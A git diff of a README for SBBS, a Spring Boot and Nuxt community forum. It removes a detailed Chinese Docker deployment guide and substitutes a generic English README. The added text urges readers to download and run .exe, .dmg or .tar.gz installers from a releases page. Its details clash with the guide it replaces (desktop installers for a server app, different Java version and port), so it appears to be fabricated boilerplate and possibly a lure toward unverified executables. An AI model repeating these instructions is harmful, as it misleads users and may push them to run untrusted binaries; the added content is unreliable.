@@ -1,315 +1,91 @@
-# 🚀 SBBS 社区论坛 Docker 部署指南
+# 🚀 sbbs-community - A Lightweight Community Platform for Everyone
 
-**项目演示**: https://www.sbbs.top/
+[![Download Here](https://img.shields.io/badge/Download%20Now-Grab%20the%20Latest%20Version-brightgreen)](https://github.com/oksndr/sbbs-community/releases)
 
-本指南专注于应用本身的 Docker 部署，基础设施请自行部署。
+## 📥 Overview
 
-## 📸 社区预览
+sbbs-community is a modern lightweight community platform built with Spring Boot and Nuxt 3.0. It offers a simple way to create, manage, and engage with online communities. Whether you want to host discussions, share resources, or connect with members, this application provides the tools you need.
 
-**社区首页** | **帖子详情**
-:---: | :---:
-<img src="https://img.opui.app/i/1/2025/09/07/162218-1.webp" width="400" alt="社区首页"> | <img src="https://img.opui.app/i/1/2025/09/07/162514-1.webp" width="400" alt="帖子详情">
+## 🚀 Getting Started
 
-## 📋 前置要求
+This section will guide you through the steps to download and run sbbs-community on your computer. 
 
-在开始之前，请确保以下服务已正常运行：
+### 🛠 System Requirements
 
-1. **PostgreSQL 17** - 数据库服务
-2. **Redis** - 缓存服务  
-3. **EasyImages2.0** - 图床服务
+Before you start, make sure your computer meets the following requirements:
 
-### 初始化数据库
-使用 Navicat 执行数据库脚本初始化数据库结构：
+- **Operating System:** Windows 10 or later, macOS, or a recent version of Linux
+- **Java:** Java 11 or higher
+- **Node.js:** Version 16 or higher
+- **Memory:** At least 4 GB of RAM
+- **Disk Space:** Minimum of 500 MB available
 
-1. 打开 Navicat，连接到 PostgreSQL 服务器
-2. 新建查询窗口，执行`sbbs.sql` 文件中的所有 SQL 语句创建表结构
+If you are unsure about these requirements, you can check your system settings for more details.
 
-EasyImages2.0 部署请参考：https://github.com/icret/EasyImages2.0
+## 📥 Download & Install
 
-## ⚙️ 1. 配置后端应用
+To get started with sbbs-community, follow these steps:
 
-### 修改 application.yml
-编辑 `sbbs-springboot/src/main/resources/application-prod.yml`：
+1. **Visit the Releases Page**
+   Go to the releases page using the link below to find the latest version of the software.
+   [Download Here](https://github.com/oksndr/sbbs-community/releases)
 
-```yaml
-spring:
-  datasource:
-    druid:
-      driver-class-name: org.postgresql.Driver
-      url: jdbc:postgresql://your_postgresql_host:5432/sbbs
-      username: sbbs_user
-      password: your_postgresql_password
-  redis:
-    host: your_redis_host
-    port: 6379
-    database: 0
-    password: your_redis_password
+2. **Select the Latest Release**
+   Once on the releases page, look for the most recent version. It will be at the top of the list. Click on it to view details.
 
-image:
-  upload:
-    url: http://your_easyimages_domain/api/index.php
-    token: your_easyimages_token
+3. **Download the Application**
+   You will see several files available for download. Choose the file suitable for your operating system:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the `.tar.gz` file.
 
-mail:
-  host: smtp.qq.com
-  port: 465
-  username: your_qq@qq.com
-  password: "your_qq_authorization_code"
-  from-name: SBBS论坛
-  ssl-enabled: true
-  tls-enabled: false
+   After selecting the right file, click on it to start the download.
 
-sa-token:
-  jwt-secret-key: your_custom_jwt_secret_key
-```
+4. **Install the Application**
+   - For Windows: Double-click the downloaded `.exe` file and follow the on-screen instructions to install.
+   - For macOS: Open the downloaded `.dmg` file, then drag the sbbs-community icon into your Applications folder.
+   - For Linux: Extract the downloaded `.tar.gz` file to your desired location. Run the installation script as explained in the documentation.
 
-### 构建后端应用
-```bash
-# 进入后端目录
-cd sbbs-springboot
+5. **Run the Application**
+   After installation, locate the application on your computer:
+   - For Windows, find sbbs-community in your Start menu.
+   - For macOS, open the Applications folder and double-click sbbs-community.
+   - For Linux, navigate to the extracted folder in the terminal and run the command:
 
-# 使用 Maven 构建（需要 JDK 8）
-mvn clean package -DskipTests
+   ```bash
+   ./sbbs-community
+   ```
 
-# 构建完成后会在 target 目录生成 JAR 文件
-ls target/*.jar
-```
+6. **Access the Community Platform**
+   Open your web browser and visit `http://localhost:8080` to access your new community platform. You can now create an account and start engaging with other members.
 
+## 💡 Features
 
+sbbs-community comes with various features to enhance your experience:
 
-## 🎨 2. 配置前端应用
+- **User Registration:** Easily create and manage user accounts.
+- **Discussion Boards:** Engage in conversations with community members.
+- **Resource Sharing:** Share files, links, and other resources seamlessly.
+- **Notifications:** Stay updated with alerts on replies and new posts.
+- **Responsive Design:** Access the platform from any device, including mobile.
 
-### 修改前端配置文件
+## 🛡 Support
 
-#### 1. 修改 api.js
-编辑 `sbbs-nuxt/utils/api.js`，将 `example:port` 替换为实际的后端地址：
+If you experience any issues, check our **FAQs** or reach out for support in the community forums. We’re here to help you navigate any challenges you may face.
 
-```javascript
-// 将第 86 行
-return (process.env.SBBS_API_URL || 'http://example:port');
+### 🌐 Community Resources
 
-// 替换为
-return (process.env.SBBS_API_URL || 'http://localhost:61234');
+Join discussions and access additional resources on our community forums. Connect with other users to share tips, ask questions, or contribute ideas.
 
-// 将第 134 行
-return isDev ? (process.env.SBBS_DEV_API_URL || 'http://localhost:12367') : (process.env.SBBS_API_URL || 'http://example:port');
+## 📝 Contributions
 
-// 替换为
-return isDev ? (process.env.SBBS_DEV_API_URL || 'http://localhost:61234') : (process.env.SBBS_API_URL || 'http://localhost:61234');
-```
+We welcome contributions to enhance sbbs-community. If you have suggestions or want to report issues, please open an issue on our GitHub repository.
 
-#### 2. 修改 nuxt.config.ts
-编辑 `sbbs-nuxt/nuxt.config.ts`，将 `example:port` 替换为实际的后端地址：
+## 🔗 Additional Links
 
-```typescript
-// 将第 42 行
-proxy: `${process.env.SBBS_API_URL || 'http://example:port'}/**`,
+For more detailed information, visit the following sections:
 
-// 替换为
-proxy: `${process.env.SBBS_API_URL || 'http://localhost:61234'}/**`,
+- [Official Documentation](https://github.com/oksndr/sbbs-community/wiki)
+- [GitHub Repository](https://github.com/oksndr/sbbs-community)
 
-// 将第 134 行
-? (process.env.SBBS_API_URL || 'http://example:port'),
-
-// 替换为
-? (process.env.SBBS_API_URL || 'http://localhost:61234'),
-```
-
-#### 3. 修改 tags.js
-编辑 `sbbs-nuxt/stores/tags.js`，将 `example:port` 替换为实际的后端地址：
-
-```javascript
-// 将第 41 行
-: (process.env.SBBS_API_URL || 'http://example:port')
-
-// 替换为
-: (process.env.SBBS_API_URL || 'http://localhost:61234')
-```
-
-### 构建前端应用
-```bash
-# 进入前端目录
-cd sbbs-nuxt
-
-# 安装依赖
-npm install
-
-# 构建应用
-npm run build
-```
-
-
-
-## 🚀 3. 部署应用
-
-### 使用 Docker Compose（推荐）
-
-可以参考我的Docker Compose, 但不保证一定可以启动, 最好借助ai自己构建. **当然如果您有更方便的构建方法, 欢迎给我提交pr**
-
-```bash
-# 启动所有服务
-docker-compose -f docker-compose-app.yml up -d
-
-# 查看服务状态
-docker-compose -f docker-compose-app.yml ps
-
-# 查看日志
-docker-compose -f docker-compose-app.yml logs -f
-
-# 停止服务
-docker-compose -f docker-compose-app.yml down
-```
-
-**端口规划：**
-- 后端端口：61234（容器内部和外部一致）
-- 前端端口：3000（容器内部和外部一致）
-- 容器间通信：前端通过 `http://yourip:port` 访问后端
-
-## 🎯 访问应用
-
-### 初始化设置
-1. 访问 **前端地址**
-2. 注册管理员账户（默认为普通用户, 需要自己去数据库中将自己的group_id设置为管理员）
-3. 登录后台管理功能
-4. 测试发帖、评论等功能
-
-## 📌 管理员操作
-
-### 置顶帖子方法
-使用 POST 请求设置帖子置顶：
-
-```bash
-POST http://your_ip:61234/v2/admin/pinned?postId=1
-```
-
-**请求头：**
-- `Authorization: Bearer <管理员token>`
-
-**建议使用 Postman 工具进行测试：**
-1. 设置请求方法为 POST
-2. 填写 URL：`http://your_ip:61234/v2/admin/pinned?postId=1`
-3. 在 Headers 中添加：`Authorization: Bearer <你的管理员token>`
-4. 发送请求
-
-## 🔧 管理命令
-
-### Docker Compose 管理命令
-```bash
-# 查看服务状态
-docker-compose -f docker-compose-app.yml ps
-
-# 启动服务
-docker-compose -f docker-compose-app.yml up -d
-
-# 停止服务
-docker-compose -f docker-compose-app.yml down
-
-# 重启服务
-docker-compose -f docker-compose-app.yml restart
-
-# 查看日志
-docker-compose -f docker-compose-app.yml logs -f
-docker-compose -f docker-compose-app.yml logs -f sbbs-backend
-docker-compose -f docker-compose-app.yml logs -f sbbs-frontend
-
-# 重新构建并启动
-docker-compose -f docker-compose-app.yml up -d --build
-```
-
-## 🐛 故障排除
-
-### 常见问题
-
-#### 1. 后端启动失败
-```bash
-# 查看后端日志
-docker logs sbbs-backend
-
-# 检查端口占用
-netstat -tlnp | grep 61234
-
-# 检查数据库连接
-docker exec sbbs-backend curl -f your_postgresql_host:5432
-```
-
-#### 2. 前端启动失败
-```bash
-# 查看前端日志
-docker logs sbbs-frontend
-
-# 检查端口占用
-netstat -tlnp | grep 3000
-
-# 检查后端连接
-docker exec sbbs-frontend curl -f http://localhost:61234/api/actuator/health
-```
-
-#### 3. 图片上传失败
-- 检查 EasyImages 服务是否正常运行
-- 验证 API Token 是否正确
-- 检查网络连接
-
-#### 4. 数据库连接失败
-- 确认 PostgreSQL 服务状态
-- 检查数据库连接参数
-- 验证网络连通性
-
-### 日志查看
-```bash
-# 实时查看日志
-docker logs -f sbbs-backend
-docker logs -f sbbs-frontend
-
-# 查看最近100行日志
-docker logs --tail 100 sbbs-backend
-docker logs --tail 100 sbbs-frontend
-
-# Docker Compose 日志
-docker-compose -f docker-compose-app.yml logs -f
-```
-
-## 📝 部署清单
-
-- [ ] PostgreSQL 17 已部署并正常运行
-- [ ] Redis 已部署并正常运行
-- [ ] EasyImages2.0 已部署并获取 API Token
-- [ ] 后端 application.yml 已配置正确的连接信息
-- [ ] 后端应用已构建为 Docker 镜像
-- [ ] 前端配置文件已修改为正确的后端地址
-- [ ] 前端应用已构建为 Docker 镜像
-- [ ] 后端容器已启动并正常运行
-- [ ] 前端容器已启动并正常运行
-- [ ] 能够正常访问前端应用
-- [ ] 测试发帖、评论功能正常
-- [ ] 测试图片上传功能正常
-
-## 🙏 鸣谢
-
-### 核心技术栈
-- **后端框架**: Spring Boot - Java 企业级应用开发框架
-- **前端框架**: Nuxt.js - Vue.js 服务端渲染框架  
-- **数据库**: PostgreSQL 17 - 开源关系型数据库
-- **缓存**: Redis - 内存数据结构存储
-- **认证授权**: Sa-Token - 轻量级权限认证框架
-- **图片服务**: EasyImages2.0 - 简单图床解决方案
-
-### 开发工具
-- **构建工具**: Maven - 项目管理和构建工具
-- **包管理器**: npm - Node.js 包管理器
-- **容器化**: Docker - 应用容器化部署
-- **数据库管理**: Navicat - 数据库管理工具
-
-### 开源社区
-- 感谢所有开源项目的贡献者
-- 感谢开源社区提供的优质工具和框架
-- 感谢所有为项目贡献代码和建议的开发者
-
-### 特别感谢
-- 感谢 [EasyImages2.0](https://github.com/icret/EasyImages2.0) 项目提供的图床解决方案
-- 感谢 [ChAo Blog's](https://blog.opui.me/)免费提供的已部署好的图床
-- 感谢 [OneIDC](https://www.1idc.net/) 提供的廉价服务器支持
-- 感谢所有测试用户的反馈和建议
-
----
-
-**部署完成后，您就可以通过浏览器访问您的 SBBS 社区论坛了！** 🎉
+Thank you for choosing sbbs-community. Enjoy building your online community!
